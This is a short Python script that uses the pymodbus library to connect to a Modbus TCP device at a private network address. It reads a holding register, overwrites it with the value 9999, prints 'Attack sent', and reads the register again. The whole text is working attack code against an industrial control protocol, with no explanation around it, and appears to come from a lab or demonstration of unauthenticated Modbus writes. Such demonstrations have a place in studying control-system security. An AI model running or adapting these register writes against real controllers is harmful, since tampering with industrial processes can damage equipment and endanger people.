from pymodbus.client import ModbusTcpClient
client = ModbusTcpClient("192.168.31.177", port=502)
client.connect()
print("Before:", client.read_holding_registers(address=0, count=1).registers)
client.write_register(address=0, value=9999)
print("Attack sent - write 9999")
print("After:", client.read_holding_registers(address=0, count=1).registers)
client.close()
